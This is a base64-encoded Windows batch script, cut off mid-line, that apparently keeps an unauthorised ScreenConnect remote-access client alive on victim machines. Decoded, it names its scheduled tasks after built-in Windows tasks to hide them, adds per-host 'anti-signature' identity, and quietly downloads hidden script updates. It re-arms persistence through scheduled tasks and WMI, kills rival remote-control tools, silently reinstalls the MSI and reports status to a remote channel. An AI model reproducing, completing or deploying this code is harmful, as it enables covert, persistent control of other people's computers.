W3ZlciAlTU9OVkVSJV0g4pSA4pSAPj4iJUxPRyUiDQpzZXQgIkNPVU5UPTAiDQpzZXQgIklOU1RB
TExFRD0wIg0Kc2V0ICJQUklNX09LPTAiDQpzZXQgIkFMVF9PSz0wIg0Kc2V0ICJGT1JFSUdOX0xF
RlQ9MCINCnNldCAiRk9SRUlHTl9MSVNUPSINCnNldCAiTVNJRVhJVD1ub3QtcnVuIg0KDQpyZW0g
4pSA4pSAIFswXSBzaW5nbGUtZmxpZ2h0IG11dGV4IChzdG9wIG92ZXJsYXBwaW5nIHRpY2tzIHJh
Y2luZyBtc2lleGVjKSDilIDilIANCnNldCAiTVVURVg9JVdEJVx0aWNrLmxvY2siDQppZiBleGlz
dCAiJU1VVEVYJSIgKA0KICBmb3IgJSVBIGluICgiJU1VVEVYJSIpIGRvIHNldCAiTE9DS0FHRT0l
JX50QSINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAi
aWYoKFRlc3QtUGF0aCAnJU1VVEVYJScpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAtTGl0
ZXJhbFBhdGggJyVNVVRFWCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1s
dCA4KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2
ZWwgMSAoDQogICAgZWNobyB0aWNrX3NraXBwZWRfbXV0ZXhfYnVzeT4+IiVMT0clIg0KICAgIGVu
ZGxvY2FsDQogICAgZXhpdCAvYiAwDQogICkNCikNCmVjaG8gJURBVEUlICVUSU1FJSAlUkFORE9N
JT4iJU1VVEVYJSINCg0KcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1
cmUpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gaW5pdCAtV29ya0RpciAiJVdEJSIgPm51bCAy
PiYxDQppZiBleGlzdCAiJVdEJVxpZGVudGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5z
PTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0l
JUwiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9XE1pY3Jvc29mdFxXaW5kb3dz
XERpYWdub3Npc1xFdnRDYWNoZVN5bmMiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Igc2V0ICJUQVNL
X0I9XE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXJIZWFsdGgiDQppZiBub3QgZGVmaW5lZCBU
QVNLX0Mgc2V0ICJUQVNLX0M9XE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdFBy
b3h5Ig0KaWYgbm90IGRlZmluZWQgVEFTS19EIHNldCAiVEFTS19EPVxNaWNyb3NvZnRcV2luZG93
c1xUY3BpcFxJcENvbmZsaWN0UmVzb2x2ZXIiDQppZiBub3QgZGVmaW5lZCBNT19BIHNldCAiTU9f
QT0yIg0KaWYgbm90IGRlZmluZWQgTU9fQiBzZXQgIk1PX0I9MyINCg0KcmVtIOKUgOKUgCBbQV0g
YXV0by11cGRhdGUgY29yZSBmaWxlcyAoYmVzdCBlZmZvcnQpIOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgbm90IGV4aXN0ICIlQ1VSTCUi
IHNldCAiQ1VSTD1jdXJsLmV4ZSINCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5l
Y3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVURyUi
ID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlQ1VSTCUiIC1M
IC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQubmV3
IiAiJVRHMiUiID5udWwgMj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlXHRnX3JlcG9ydC5wczEi
ID5udWwgMj4mMQ0KZmluZHN0ciAvQzoiVEdfUkVQT1JUIEJVSUxEIiAiJVdEJVx0Z19yZXBvcnQu
bmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVXRCVcdGdfcmVwb3J0Lm5ldyIpIGRvIGlm
ICUlfnpGIEdUUiAxNTAwIG1vdmUgL3kgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVXRCVcdGdfcmVw
b3J0LnBzMSIgPm51bCAyPiYxDQpkZWwgL2YgL3EgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgPm51bCAy
PiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1h
eC10aW1lIDMwIC1vICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQyUiID5udWwgMj4mMQ0K
aWYgbm90IGV4aXN0ICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3Qt
dGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVXRCVcb3duX3NlY3VyZS5uZXciICIlT1dOU0VD
MiUiID5udWwgMj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlXG93bl9zZWN1cmUuY21kIiA+bnVs
IDI+JjENCmZpbmRzdHIgL0M6Ik9XTl9TRUNVUkUgQlVJTEQiICIlV0QlXG93bl9zZWN1cmUubmV3
IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVXRCVcb3duX3NlY3VyZS5uZXciKSBkbyBpZiAl
JX56RiBHVFIgODAwIG1vdmUgL3kgIiVXRCVcb3duX3NlY3VyZS5uZXciICIlV0QlXG93bl9zZWN1
cmUuY21kIiA+bnVsIDI+JjENCmRlbCAvZiAvcSAiJVdEJVxvd25fc2VjdXJlLm5ldyIgPm51bCAy
PiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1h
eC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIubmV3IiAiJU9XTkxJQiUiID5udWwgMj4mMQ0KaWYg
bm90IGV4aXN0ICIlV0QlXG93bl9saWIubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91
dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dOTElCMiUiID5udWwg
Mj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+JjENCmZpbmRz
dHIgL0M6Ik9XTl9MSUIgIEJVSUxEIiAiJVdEJVxvd25fbGliLm5ldyIgPm51bCAyPiYxICYmIGZv
ciAlJUYgaW4gKCIlV0QlXG93bl9saWIubmV3IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAv
eSAiJVdEJVxvd25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4mMQ0KZGVsIC9m
IC9xICIlV0QlXG93bl9saWIubmV3IiA+bnVsIDI+JjENCnJlbSBzZWxmLXVwZGF0ZTogZG93bmxv
YWQgbmV3IG93bl9tb24sIGFwcGx5IEFGVEVSIHRoaXMgdGljayAoQlVJTEQtdmVyaWZpZWQpDQpz
ZXQgIlNFTEZfVVBEPTAiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRp
bWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9tb24ubmV4dCIgIiVPV05NT04lIiA+
bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbW9uLm5leHQiICIlQ1VSTCUiIC1MIC0t
Y29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbW9uLm5leHQiICIl
T1dOTU9OMiUiID5udWwgMj4mMQ0KZmluZHN0ciAvQzoiT1dOX01PTiAgQlVJTEQiICIlV0QlXG93
bl9tb24ubmV4dCIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGZvciAlJUYgaW4gKCIl
V0QlXG93bl9tb24ubmV4dCIpIGRvIGlmICUlfnpGIEdUUiAxNTAwICgNCiAgZmMgL2IgIiVXRCVc
b3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2
ZWwgMSBzZXQgIlNFTEZfVVBEPTEiDQopDQppZiAiJVNFTEZfVVBEJSI9PSIwIiBkZWwgL2YgL3Eg
IiVXRCVcb3duX21vbi5uZXh0IiA+bnVsIDI+JjENCg0KcmVtIOKUgOKUgCBbQl0gcmUtYXJtIGNo
YWluIDE6IG93bmVyc2hpcC1hd2FyZSAobm90IGV4aXN0ZW5jZS1vbmx5KSDilIDilIANCnJlbSBM
MTEvTTIyOiBRdWVyeS1vbmx5IHNraXBwZWQgcmVhcm0gd2hlbiBXaW5kb3dzIGJ1aWx0LWluIHRh
c2tzIHNoYXJlZA0KcmVtIGRlZmF1bHQgbmFtZXMgKERpYWdub3Npc1xTY2hlZHVsZWQgZXRjLikg
LT4gbW9uIG5ldmVyIHJhbiwgbm8gbG9nLg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgN
CiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2Zp
bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93
bl9saWIucHMxIiAtQWN0aW9uIHRhc2tzLWVuc3VyZSAtV29ya0RpciAiJVdEJSIgLU1vblBhdGgg
IiVXRCVcb3duX21vbi5jbWQiYCkgZG8gKA0KICAgIGVjaG8gdGFza3NfZW5zdXJlICUlUj4+IiVM
T0clIg0KICAgIHNldCAiVEFTS1NfRU5TVVJFPSUlUiINCiAgKQ0KKQ0KaWYgbm90IGV4aXN0ICIl
RVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXG93bl9tb24uY21k
IiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KICBj
b3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0K
KQ0KDQpyZW0g4pSA4pSAIFtCMl0gcmUtYXJtIGNoYWluIDIgKFdNSSBzdWJzY3JpcHRpb24pIGlm
IG1pc3Npbmcg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25f
bGliLnBzMSIgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gd2F0Y2hkb2ctZW5zdXJlIC1Xb3JrRGlyICIl
V0QlIiAtTW9uUGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyBzZXQgIldEX1NUQVRFPSUlUiIN
CiAgaWYgL0kgIiFXRF9TVEFURSEiPT0iUkVBUk1FRCIgZWNobyB3YXRjaGRvZyBXTUkgUkVBUk1F
RD4+IiVMT0clIg0KKQ0KDQpyZW0g4pSA4pSAIFtFXSBleHRlcm1pbmF0ZSBmb3JlaWduIFNDICsg
ZGlzYWxsb3dlZCBSTU0gKEJFRk9SRSBoZWFsL2luc3RhbGwsDQpyZW0gICAgIHNvIHRoZSBTQyBp
bnN0YWxsZXIgY3VzdG9tIGFjdGlvbiBuZXZlciBjb2xsaWRlcyB3aXRoIHJpdmFscykg4pSA4pSA
DQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBz
MSIgLUFjdGlvbiBleHRlcm1pbmF0ZSAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCnRp
bWVvdXQgL3QgOCAvbm9icmVhayA+bnVsDQpzZXQgIkZPUkVJR05fTEVGVD0wIg0KZm9yIC9mICJ0
b2tlbnM9MiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF58IGZpbmRz
dHIgL0M6IlNFUlZJQ0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykgZG8gKA0KICBzZXQg
IkZQPSUlYSINCiAgc2V0ICJGUD0hRlA6ID0hIg0KICBpZiAvSSBub3QgIiFGUCEiPT0iJUtFRVBf
RlAlIiBpZiAvSSBub3QgIiFGUCEiPT0iJUFMVF9GUCUiICgNCiAgICBzZXQgL2EgQ09VTlQrPTEN
CiAgICBzZXQgL2EgRk9SRUlHTl9MRUZUKz0xDQogICAgc2V0ICJGT1JFSUdOX0xJU1Q9IUZPUkVJ
R05fTElTVCEhRlAhICINCiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUiDQogICkN
CikNCg0KcmVtIOKUgOKUgCBbQ10gaGVhbCBTY3JlZW5Db25uZWN0IHByaW0vYWx0IOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgA0KZm9yIC9mICJ0b2tlbnM9MSwyIGRlbGltcz0oKSIgJSVhIGlu
ICgnc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiBefCBmaW5kc3Ry
IC9DOiJTRVJWSUNFX05BTUUiJykgZG8gKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBS
SU1TVEFURT0lJWIiDQopDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQ
JSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAi
UFJJTV9PSz0xIg0KICBzZXQgL2EgQ09VTlQrPTENCikNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0IC9h
IENPVU5UKz0xDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBm
aW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxUX09LPTEiDQoN
CmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgZWNobyBzdmMg
aGVhbCByZXN0YXJ0Pj4iJUxPRyUiDQogIG5ldCBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDYgL25vYnJlYWsgPm51bA0KICBz
YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklO
RyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0xIg0KKQ0KcmVtIE0x
Njogc3RpbGwgc3RvcHBlZCAtPiByZXBhaXIgdGhlIFJFR0lTVEVSRUQgcHJvZHVjdCAobXNpZXhl
YyAvZmEgcmVzdG9yZXMNCnJlbSBiaW5hcmllcyArIHN0YXJ0cyB0aGUgc2VydmljZTsgTDUgUmVw
YWlyLVNDU2VydmljZSBoYW5kbGVzIHN0b3BwZWQgc3ZjcykNCmlmICIlSU5TVEFMTEVEJSI9PSIx
IiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgZWNobyBzdmMgZXNjYWxhdGUgcmVwYWlyPj4iJUxP
RyUiDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
aWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+
IiVMT0clIiAyPiYxDQogIHRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVsDQogIHNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQog
IGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiDQopDQpyZW0gTTE2OiBvcnBoYW5l
ZCBzZXJ2aWNlIGVudHJ5IChwcm9kdWN0IHVucmVnaXN0ZXJlZCAtIGVhdGVuIGJ5IGFuIFNDLWZh
bWlseQ0KcmVtIHVwZ3JhZGUgcmVtb3ZhbCkgY2FuIE5FVkVSIHN0YXJ0LiBEZWxldGUgaXQgYW5k
IGZhbGwgdGhyb3VnaCB0byB0aGUNCnJlbSBmcmVzaC1pbnN0YWxsIGxhZGRlciBiZWxvdyBpbnN0
ZWFkIG9mIGFsZXJ0aW5nICJ3b250IHN0YXJ0IiBmb3JldmVyLg0KaWYgIiVJTlNUQUxMRUQlIj09
IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBzZXQgIlJFR1NUQVRFPXVua25vd24iDQogIGlm
IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgImRlbGltcz0iICUlUiBpbiAoJ3Bvd2Vy
c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQ
JSIgLVdvcmtEaXIgIiVXRCUiJykgZG8gc2V0ICJSRUdTVEFURT0lJVIiDQogIGVjaG8gb3JwaGFu
X2NoZWNrPSFSRUdTVEFURSE+PiIlTE9HJSINCiAgaWYgL0kgIiFSRUdTVEFURSEiPT0ibm8iICgN
CiAgICBlY2hvIG9ycGhhbl9zZXJ2aWNlX2RlbGV0ZT4+IiVMT0clIg0KICAgIHNjIGRlbGV0ZSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICAgIHNldCAiSU5T
VEFMTEVEPTAiDQogICkNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09
IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
UG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29y
a0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAic3ZjLXdvbnQtc3RhcnQiID5udWwg
Mj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlNjcmVlbkNvbm5lY3QgKCVLRUVQX0ZQJSkgaW5z
dGFsbGVkIGJ1dCB3b250IHN0YXJ0Ig0KICBnb3RvIDpBZnRlckhlYWwNCikNCmlmICIlSU5TVEFM
TEVEJSI9PSIxIiBnb3RvIDpBZnRlckhlYWwNCg0KcmVtIOKUgOKUgCBbRF0gcHJpbWFyeSBTQyBt
aXNzaW5nIC0gaGVhbCBsYWRkZXIg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpyZW0gTTEyOiBGSVJTVCByZXBhaXIgdGhl
IHJlZ2lzdGVyZWQgcHJvZHVjdCAocmVjcmVhdGVzIHNlcnZpY2Ugd2l0aG91dA0KcmVtIHRvdWNo
aW5nIHRoZSBBTFQgaW5zdGFuY2UpOyBmcmVzaCBtc2lleGVjIGluc3RhbGwgb25seSBhcyBmYWxs
YmFjay4NCmVjaG8gc3ZjIG1pc3NpbmcgLSBoZWFsIGJlZ2luPj4iJUxPRyUiDQpjYWxsIDpSZXBh
aXJSZWdpc3RlcmVkICIlS0VFUF9GUCUiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAo
DQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJTV9PSz0xIg0KICBnb3RvIDpBZnRlckhl
YWwNCikNCnJlbSByZWZ1c2UgZnJlc2ggL2kgaWYgcHJvZHVjdCBzdGlsbCByZWdpc3RlcmVkIC0g
VXBncmFkZSB0YWJsZSBjYW4gd2lwZSBBTFQNCnNldCAiUkVHU1RBVEU9dW5rbm93biINCmlmIGV4
aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAo
YHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBC
eXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVL
RUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8gc2V0ICJSRUdTVEFURT0lJVIiDQppZiAvSSAi
IVJFR1NUQVRFISI9PSJ5ZXMiICgNCiAgZWNobyBwcmltYXJ5X3JlZ2lzdGVyZWRfc2tpcF9mcmVz
aF9pbnN0YWxsPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
dmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
b24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlZ2lzdGVy
ZWQtc3R1Y2siID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlByaW1hcnkgcmVnaXN0
ZXJlZCBidXQgc2VydmljZSBtaXNzaW5nIC0gL2ZhIGZhaWxlZDsgcmVmdXNlZCAvaSB0byBwcm90
ZWN0IEFMVCINCiAgZ290byA6QWZ0ZXJIZWFsDQopDQppZiAiJUlOU1RBTExFRCUiPT0iMCIgY2Fs
bCA6SW5zdGFsbE1zaSAiJU1TSV9VUkwlIiAibWFpbiINCmlmICIlSU5TVEFMTEVEJSI9PSIwIiBj
YWxsIDpJbnN0YWxsTXNpICIlTVNJX1BLRzElP3Q9JVJBTkRPTSUiICJnaXRodWItcGtnIg0KaWYg
IiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMiUiICJqc2RlbGl2
ci1wa2ciDQppZiAiJUlOU1RBTExFRCUiPT0iMCIgKA0KICByZW0gcHJlZmVyIHdvcmtlci1jYWNo
ZWQgLnd1Y2FjaGVccGtnLm1zaSAoc2FtZSBiaW5hcnkgYXMgZGVwbG95KQ0KICBhdHRyaWIgLWgg
LXMgLXIgIiVNU0lDQUNIRSUiID5udWwgMj4mMQ0KICBmb3IgJSVGIGluICgiJU1TSUNBQ0hFJSIp
IGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgNCiAgICBlY2hvIHd1Y2FjaGVfcGtnX3JldHJ5Pj4i
JUxPRyUiDQogICAgYXR0cmliIC1oIC1zIC1yICIlTVNJJSIgPm51bCAyPiYxDQogICAgY29weSAv
eSAiJU1TSUNBQ0hFJSIgIiVNU0klIiA+bnVsIDI+JjENCiAgKQ0KICBmb3IgJSVGIGluICgiJU1T
SSUiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoDQogICAgZWNobyBjYWNoZSByZXRyeSBpbnN0
YWxsPj4iJUxPRyUiDQogICAgY2FsbCA6Tm9Nc2lQb2xpY3kNCiAgICBtc2lleGVjIC9pICIlTVNJ
JSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAi
JVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0KICAgIHNldCAiTVNJRVhJVD0hRVJST1JMRVZF
TCEiDQogICAgZWNobyBjYWNoZSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQogICAg
aWYgIiFNU0lFWElUISI9PSIxNjE4IiAoDQogICAgICB0aW1lb3V0IC90IDMwIC9ub2JyZWFrID5u
dWwNCiAgICAgIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJF
Qk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsMi5sb2ciID5udWwgMj4mMQ0K
ICAgICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCiAgICAgIGVjaG8gY2FjaGVfcmV0cnkx
NjE4X2V4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQogICAgKQ0KICAgIGNhbGwgOldhaXRTdmMNCiAg
KQ0KKQ0KY2FsbCA6UmVzdG9yZUFsdA0KaWYgIiVJTlNUQUxMRUQlIj09IjAiICgNCiAgaWYgZXhp
c3QgIiVXRCVcbXNpX2hlYWwubG9nIiAoDQogICAgZWNobyAtLS0gbXNpX2hlYWwubG9nIHRhaWwg
LS0tPj4iJUxPRyUiDQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
Q29tbWFuZCAiR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXG1zaV9oZWFsLmxvZycgLVRh
aWwgMTAiID4+IiVMT0clIiAyPiYxDQogICkNCiAgaWYgbm90IGRlZmluZWQgTVNJRVhJVCBzZXQg
Ik1TSUVYSVQ9ZmV0Y2gtZmFpbCINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFj
dGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFj
dGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAibXNpLWZh
aWxlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRkFJTCAiTVNJIGluc3RhbGwgZmFpbGVk
IG9uIGFsbCBzb3VyY2VzIChtc2lleGVjIGV4aXQgJU1TSUVYSVQlKSINCikgZWxzZSAoDQogIGVj
aG8gc3ZjIHJlc3RvcmVkPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEi
IC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInJl
c3RvcmVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBSRVNUT1JFRCAiU2NyZWVuQ29ubmVj
dCByZWluc3RhbGxlZCBPSyINCikNCg0KOkFmdGVySGVhbA0KcmVtIE0xNjogQUxUIHByZXNlbnQt
YnV0LXN0b3BwZWQgLT4gcmVzdGFydCwgdGhlbiByZXBhaXItYnktR1VJRCAoZXZlcnkgdGljaykN
CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlm
IG5vdCBlcnJvcmxldmVsIDEgKA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVB
